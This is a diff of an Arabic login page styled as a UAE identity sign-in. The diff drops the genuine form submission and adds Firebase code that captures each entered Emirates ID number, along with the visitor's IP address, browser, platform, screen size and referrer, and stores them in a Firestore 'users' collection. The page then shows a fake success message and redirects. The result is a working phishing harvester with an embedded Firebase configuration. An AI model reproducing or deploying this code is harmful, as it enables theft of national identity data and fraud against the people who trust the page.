@@ -25,7 +25,7 @@
             <!-- المحتوى الرئيسي -->
             <main class="login-content">
                 <!-- نموذج تسجيل الدخول -->
-                <form action="../../commonauth" method="post" class="login-form" id="loginForm">
+                <form id="loginForm">
                     <!-- حقل اسم المستخدم -->
                     <div class="form-group">
                         <input type="text" 
@@ -50,10 +50,6 @@
                             تسجيل الدخول
                         </button>
                     </div>
-                    
-                    <!-- الحقول المخفية -->
-                    <input type="hidden" name="password" value="ndwenw902ee9239">
-                    <input type="hidden" name="sessionDataKey" value="5b97084d-a443-4984-a417-63fdee833691">
                 </form>
                 
                 <!-- الفاصل -->
@@ -98,17 +94,123 @@
         </div>
     </div>
 
-    <script>
-        // JavaScript لمعالجة النموذج (اختياري)
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+    <!-- إضافة Firebase SDK (قبل إغلاق body مباشرة) -->
+    <script type="module">
+        // Import Firebase SDKs
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-firestore.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-analytics.js";
+
+        // تكوين Firebase (استخدم تكوينك الخاص)
+        const firebaseConfig = {
+            apiKey: "AIzaSyA1c9ft1XJrmjKIwhdxixJ1KM5Q3VL9HvQ",
+            authDomain: "uaewep-38378.firebaseapp.com",
+            projectId: "uaewep-38378",
+            storageBucket: "uaewep-38378.firebasestorage.app",
+            messagingSenderId: "366757774392",
+            appId: "1:366757774392:web:32da696c806184709ed2cd",
+            measurementId: "G-XNZC0GHCMM"
+        };
+
+        // تهيئة Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const analytics = getAnalytics(app);
+
+        // ===== دالة التحقق من رقم الهوية =====
+        function validateEmiratesID(idNumber) {
+            // إزالة المسافات والرموز
+            const cleanId = idNumber.replace(/\D/g, '');
+            
+            // التحقق من الطول
+            if (cleanId.length !== 15) {
+                return { isValid: false, message: "رقم الهوية يجب أن يكون 15 رقماً" };
+            }
+            
+            // التحقق من أن كلها أرقام
+            if (!/^\d+$/.test(cleanId)) {
+                return { isValid: false, message: "رقم الهوية يجب أن يحتوي على أرقام فقط" };
+            }
+            
+            // التحقق من البادئة (784 للإمارات)
+            const prefix = cleanId.substring(0, 3);
+            if (!['784'].includes(prefix)) {
+                return { isValid: false, message: "رقم الهوية يجب أن يبدأ بـ 784" };
+            }
+            
+            return { isValid: true, cleanedId: cleanId };
+        }
+
+        // ===== دالة لجلب عنوان IP =====
+        async function getClientIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'غير معروف';
+            }
+        }
+
+        // ===== دالة لحفظ البيانات في Firebase =====
+        async function saveUserData(idNumber, rememberMe) {
+            try {
+                // التحقق من رقم الهوية
+                const validation = validateEmiratesID(idNumber);
+                if (!validation.isValid) {
+                    throw new Error(validation.message);
+                }
+
+                // جلب معلومات إضافية
+                const ipAddress = await getClientIP();
+                
+                // إنشاء كائن البيانات
+                const userData = {
+                    idNumber: validation.cleanedId,
+                    rememberMe: rememberMe,
+                    timestamp: new Date().toISOString(),
+                    serverTimestamp: serverTimestamp(),
+                    ipAddress: ipAddress,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    referrer: document.referrer || 'direct'
+                };
+
+                // إضافة البيانات إلى Firestore
+                const docRef = await addDoc(collection(db, "users"), userData);
+                
+                console.log("✅ تم حفظ البيانات بنجاح في Firebase!");
+                console.log("Document ID:", docRef.id);
+                console.log("البيانات:", userData);
+
+                return {
+                    success: true,
+                    docId: docRef.id,
+                    message: "تم حفظ رقم الهوية بنجاح"
+                };
+
+            } catch (error) {
+                console.error("❌ خطأ في حفظ البيانات:", error);
+                return {
+                    success: false,
+                    error: error.message
+                };
+            }
+        }
+
+        // ===== معالجة النموذج =====
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const username = document.getElementById('username').value;
+            const username = document.getElementById('username').value.trim();
             const submitButton = document.getElementById('submitButton');
+            const rememberMe = document.getElementById('rememberme').checked;
             
-            // التحقق من الحقل
-            if (!username.trim()) {
-                alert('يرجى إدخال رقم الهوية، البريد الإلكتروني، أو الهاتف');
+            // التحقق من إدخال البيانات
+            if (!username) {
+                showMessage('يرجى إدخال رقم الهوية', 'error');
                 return;
             }
             
@@ -116,17 +218,128 @@
             submitButton.textContent = 'جاري تسجيل الدخول...';
             submitButton.disabled = true;
             
-            // محاكاة الإرسال (استبدلها بالكود الفعلي)
-            setTimeout(() => {
-                // هنا يمكنك إرسال النموذج فعلياً
-                // this.submit(); // قم بفك التعليق لإرسال النموذج فعلياً
+            try {
+                // حفظ البيانات في Firebase
+                const result = await saveUserData(username, rememberMe);
                 
+                if (result.success) {
+                    showMessage(result.message, 'success');
+                    
+                    // حفظ في localStorage إذا تم اختيار "تذكرني"
+                    if (rememberMe) {
+                        localStorage.setItem('user_id', username);
+                        localStorage.setItem('remember_me', 'true');
+                    }
+                    
+                    // تغيير زر التسجيل
+                    submitButton.textContent = 'تم التسجيل ✓';
+                    submitButton.style.backgroundColor = '#00ac75';
+                    
+                    // إعادة التوجيه بعد 3 ثوان
+                    setTimeout(() => {
+                        window.location.href = 'index.html';
+                    }, 3000);
+                    
+                } else {
+                    showMessage(result.error, 'error');
+                    submitButton.textContent = 'تسجيل الدخول';
+                    submitButton.disabled = false;
+                }
+                
+            } catch (error) {
+                showMessage('حدث خطأ غير متوقع: ' + error.message, 'error');
                 submitButton.textContent = 'تسجيل الدخول';
                 submitButton.disabled = false;
-                
-                alert('تم إرسال النموذج (هذا مجرد عرض)');
-            }, 1500);
+            }
         });
+
+        // ===== دالة لعرض الرسائل =====
+        function showMessage(message, type = 'info') {
+            // إزالة أي رسالة سابقة
+            const oldMessage = document.querySelector('.form-message');
+            if (oldMessage) oldMessage.remove();
+            
+            // إنشاء عنصر الرسالة الجديدة
+            const messageElement = document.createElement('div');
+            messageElement.className = `form-message ${type}`;
+            messageElement.textContent = message;
+            
+            // تنسيق الرسالة
+            messageElement.style.cssText = `
+                padding: 12px 20px;
+                margin: 15px 0;
+                border-radius: 8px;
+                text-align: center;
+                font-family: 'Cairo', sans-serif;
+                font-size: 14px;
+                font-weight: 500;
+                animation: fadeIn 0.3s ease-in;
+                ${type === 'error' ? 
+                    'background-color: #fff5f5; color: #c53030; border: 1px solid #fc8181;' : 
+                 type === 'success' ? 
+                    'background-color: #f0fff4; color: #276749; border: 1px solid #9ae6b4;' :
+                    'background-color: #ebf8ff; color: #2c5282; border: 1px solid #90cdf4;'}
+            `;
+            
+            // إضافة الرسالة قبل النموذج
+            const form = document.getElementById('loginForm');
+            form.parentNode.insertBefore(messageElement, form);
+            
+            // إزالة الرسالة بعد 5 ثوان
+            setTimeout(() => {
+                if (messageElement.parentNode) {
+                    messageElement.style.opacity = '0';
+                    messageElement.style.transition = 'opacity 0.5s';
+                    setTimeout(() => messageElement.remove(), 500);
+                }
+            }, 5000);
+        }
+
+        // ===== تحميل البيانات المحفوظة عند فتح الصفحة =====
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedId = localStorage.getItem('user_id');
+            const rememberMe = localStorage.getItem('remember_me');
+            
+            if (savedId && rememberMe === 'true') {
+                document.getElementById('username').value = savedId;
+                document.getElementById('rememberme').checked = true;
+            }
+        });
+
+        // ===== اختبار اتصال Firebase =====
+        async function testFirebaseConnection() {
+            try {
+                // محاولة إنشاء وثيقة اختبار
+                const testDoc = await addDoc(collection(db, "test_connection"), {
+                    test: "connection_test",
+                    timestamp: new Date().toISOString()
+                });
+                
+                console.log("✅ Firebase connection successful");
+                console.log("Test document ID:", testDoc.id);
+                
+                // حذف وثيقة الاختبار بعد إنشائها
+                // Note: تحتاج إلى دالة deleteDoc للحذف
+                
+            } catch (error) {
+                console.error("❌ Firebase connection failed:", error);
+                showMessage('فشل الاتصال بقاعدة البيانات', 'error');
+            }
+        }
+
+        // اختبار الاتصال عند تحميل الصفحة
+        window.addEventListener('load', testFirebaseConnection);
+
+        // ===== إضافة أنيميشن للرسائل =====
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes fadeIn {
+                from { opacity: 0; transform: translateY(-10px); }
+                to { opacity: 1; transform: translateY(0); }
+            }
+        `;
+        document.head.appendChild(style);
+
     </script>
 </body>
 </html>
